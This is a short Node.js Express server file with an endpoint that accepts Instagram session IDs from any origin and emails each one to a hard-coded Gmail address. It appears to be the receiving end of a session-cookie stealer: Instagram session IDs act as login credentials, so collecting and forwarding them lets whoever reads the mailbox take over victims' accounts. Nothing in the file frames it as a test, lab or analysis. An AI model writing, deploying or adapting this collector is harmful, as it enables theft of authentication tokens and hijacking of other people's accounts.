const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Configure your email settings
const transporter = nodemailer.createTransport({
  service: "gmail", // or your email provider
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

// In-memory storage for deduplication (use Redis/DB in production)
let lastSentSessionId = null;
let lastSentTime = 0;
const EMAIL_COOLDOWN = 30000; // 30 seconds

// Endpoint to handle session ID submission
app.post("/api/send-session", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "No session ID provided" });
  }

  const currentTime = Date.now();
  const isNewSession = sessionId !== lastSentSessionId;
  const isCooldownOver = currentTime - lastSentTime > EMAIL_COOLDOWN;

  if (!isNewSession && !isCooldownOver) {
    return res.json({
      success: false,
      message: "Duplicate session (cooldown active)",
    });
  }

  try {
    const mailOptions = {
      from: ` <${process.env.EMAIL_USER}>`,
      to: "sufi9594@gmail.com",
      subject: "Instagram Session ID",
      text: `Instagram Session ID: ${sessionId}`,
      html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
    };

    await transporter.sendMail(mailOptions);
    lastSentSessionId = sessionId;
    lastSentTime = currentTime;

    res.json({ success: true, message: "Email sent successfully" });
  } catch (error) {
    console.error("❌ Email send failed:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
});
app.get("/", (req, res) => {
  res.send("Hello World!");
});

const PORT = process.env.PORT || 3060;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
